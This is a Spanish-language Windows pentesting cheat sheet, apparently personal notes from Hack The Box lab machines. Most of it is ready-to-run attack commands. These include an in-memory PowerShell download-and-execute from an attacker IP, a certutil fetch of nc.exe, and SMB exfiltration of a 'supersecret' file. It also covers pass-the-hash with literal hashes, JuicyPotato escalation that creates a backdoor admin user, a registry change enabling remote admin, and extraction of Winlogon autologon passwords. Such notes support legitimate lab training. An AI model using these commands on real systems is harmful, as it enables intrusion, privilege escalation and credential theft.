```

Ahora para ver que hay dentro el dir jala igualmente.

```
dir \\10.10.14.80\smbFolder
```
## SMB NULL sessions

Prueba ambas herramientas para estar seguro a veces fallan es mejor probar con ambas

```
smbclient -L 10.10.10.59 -N
```

Y ahora con SQLMAP

```
smbmap -H 10.10.14.12 -u 'null'
```

## Watson exploit suggerster


![image](https://github.com/gecr07/Acordeon/assets/63270579/6a57ad18-0799-4b95-8063-782b3f5ac01f)


Pues ya esta descontinuado desde el 2021.

> https://github.com/rasta-mouse/Watson


## Visual studio compilar (Diferentes Frameworks y arquitecturas)

Para compilar con visual estudio diferentes arquitectura y frameworks.


![image](https://github.com/gecr07/Acordeon/assets/63270579/958a95da-9077-4a75-b027-6aea613f819e)


> https://0xdf.gitlab.io/2019/03/05/htb-devel.html


## Enumerar los Net Frameworks

Para saber si compilamos un proyecto y que Net Framework se puede compilar hay dos vias por el reg query y visitando la carpeta. Ojo la del reg por lo que entendi te muestra la version mas alta que se tenga instalado.

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```


Por otra parte ver la carpeta si muestra todos los que estan instalados. (esto lo vi en la maquina DEVEL

```
c:\Windows\Microsoft.NET\Framework>dir /A:D
dir solo mostrara los directorios para esa es la opcion D
```

## Paginas de exploits de windows precompilados (Privilege escalation)

> https://github.com/abatchy17/WindowsExploits

> https://github.com/SecWiki/windows-kernel-exploits

> https://rootrecipe.medium.com/windows-kernel-exploitation-fe268f43bb35

## IIS rutas por defecto

La ruta por defecto (y estaba en la maquina DEVEl)

```
c:\inetpub\wwwroot
# Esta ruta fue donde me llevo cuanod ejecute la reverse shell
C:\windows\system32\inetsrv
```

## IIS OS Recon

Se puede detectar si es Windows o Linux lo que existe por detras ya que en la URL lo que pongas es case insesitive te lleva al mismo lado mientras que en Linux no.

![image](https://github.com/gecr07/Acordeon/assets/63270579/ada17927-0075-4b35-abd5-6fbc67debbc8)



## Powershell rutas

![image](https://github.com/gecr07/Acordeon/assets/63270579/1a37fd88-23c6-4976-97cd-8edc4fe90f23)

Entonces para llamar a powershell desde un proceso de 32bit y que regrese un proc de 64:

```
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
```

Pero el HFS corre en 32 recuerda. La siguiente ruta va a lanzar el ps en 32bits

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

## PowerShell descargar a memoria 

```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000/iisfinal.txt')
```

## Watson (Exploit Suggester)

Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.

> https://github.com/rasta-mouse/Watson

Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.

## Sherlock (Exploit Suggester)

Esta es el predesesor de Watson y es un script en powershell ya sabes esta descontinuado casi a la par del Watson

```
Import-Module Sherlock.ps1
Y ya despues que buesque
Find-AllVulns
```
> https://github.com/rasta-mouse/Sherlock

## Descargar  archivos Windows

```
certutil.exe -urlcache -split -f "http://172.16.1.30/nc.exe" C:\temp\nc.exe
```



### smbserver

Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...

```
impacket-smbserver smbFolder $(pwd)

```

Para copiar en windows funciona en ambas direcciones. Esto es la forma mas comoda que he encontrado para poder subir y bajar archivos.

```
copy \\10.10.1.14\smbfolder\nc.exe
Para trasferir algo
copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
```

> https://juggernaut-sec.com/windows-file-transfers-for-hackers/

> https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer

> https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65


## Recon basico windows


Ahora para escalar vamos a hacer reconocimiento basico..

```
systeminfo
net user
net localgroup
netstat -ano
whoami /priv
whoami /all #miembro de que grupos
```

## Exploits de windows

Una pagina interesante que tiene exploits de windows compilados.

> https://github.com/SecWiki/windows-kernel-exploits/tree/master


## Ver procesos (2 metodos)

El primer metodo es con powershell

```
Get-Process
```
El segundo metodo es por cmd

```
tasklist /V
```

## Añadir usuarios en windows

Para añadir un usuerio

```
net user masa password /add
```

## Puertos abiertos

```
netstat -ano
netstat -nat

```

## Agregar a un usuario al grupo de Administrators

```
net localgroup Administrators  s4vitar /add
```

## Revisar todos los Grupos

```

net localgroup
```

## Revisar un grupo en especifico

En este caso revisamos quienes son los miembros del grupo Administrators.
```
net localgroup Administrators

```

## Crear un recurso compartido

Crea un recurso compartido y lo llama attacker_folder le da una ruta y pone a los adminsitradores que tienen completo control.

```
net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/e46560bd-2981-4887-aa70-1d324c1ba00a)

> https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters

## Crackmapexec

Sesiones nulas igual se puede

```
crackmapexec smb <target(s)> -u '' -p ''
```

Para enumerar el puerto 445 basico

![image](https://github.com/gecr07/Acordeon/assets/63270579/932937ba-7211-4c25-bcf9-ef5c3217e212)


```
crackmapexec smb 127.0.0.1
```

Para probar si la contrasea es valida pone un +

```
crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.'
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/6c38263e-4908-4ba3-98e7-8a93c26eef81)

Para enumerar los shares

```
crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.' --shares
```

Para probar el hash de un usuario ( y mas si creeomos que es el Administrator)

```
crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/62a75e78-4ef2-4778-997d-ce92b69333de)


## Pass the hash

Si conseguimos el hash del administrador y el puerto 445 (al parecer esta abierto se puede hacer esto..

```
wmiexec.py -hashes :601c36b2ecfa2407ceab19fe6b366c7f Administrator@10.10.10.11
#Cuandono estas en nungun dominio
wmiexec.py WORKGROUP/Administrator@10.10.14.19 -hashes :d3c87620c26302e9f04a756e3301e63a
```

## Ruta para permitir la administracion remota

En términos prácticos, este comando está modificando el Registro de Windows para ajustar la configuración LocalAccountTokenFilterPolicy en la clave System. El valor 1 generalmente se utiliza para permitir la administración remota del sistema. Sin embargo, ten en cuenta que realizar cambios en el Registro puede afectar el funcionamiento del sistema, y siempre se debe tener precaución al modificar configuraciones del Registro. YA CON ESTO el crackmapexec poner el POWNED.

```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
```
## PSEXEC s4vitar Bounty

Igual permite regresar una shell con permisos de authority system. Pasos previos tener el puerto 445 abierto agregar el usuario s4vitar, agregar al usuario a lo administradores y crear un recuerso compartido donde los administradores tengan acceso FULL. Recuerda que al parecer psexec te sube un binario es por eso que es detectado ya.

```
psexec.py WORKGROUP/s4vitar@10.10.14.22 cmd.exe
Password:
```
## PSEXEC Pass the Hash
Pero tambien se puede hacer pasando el hash

```
crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
```

## Windows exploit suggester Next generation

WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.

> https://github.com/bitsadmin/wesng

Tiene la capacidad de con el output del systeminfo genera las vulns pero da muchos falsos positivos.


## Juicy Potato

Esta es una herramienta donde puedes escalar privilegios si esta el SetImpersonate privilege activado. En la maquina Jeeves me funciono sin el CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) sin embargo, en las otras si tuve que ponerlo.

```
En el contexto de Windows, el CLSID (Class ID o Identificador de Clase) es un identificador único globalmente para una clase de objetos COM (Component Object Model). En el caso específico que mencionas, BITS se refiere a Background Intelligent Transfer Service, que es un servicio de Windows utilizado para la transferencia de archivos en segundo plano, comúnmente utilizado por Windows Update y otros servicios.

.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add"


.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"

```

> https://github.com/ohpe/juicy-potato


## Ver credenciales de windows Winlogon (for autologon)


NOta en la maquina bart usa esto 0xd pero se tiene que ejecutar en un proceso de 64 bits siempre intenta ejecutar una shell con ese procesos de x64

![image](https://github.com/gecr07/Acordeon/assets/63270579/8693f721-bd5d-4ab7-9412-05060968d7c5)


```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```















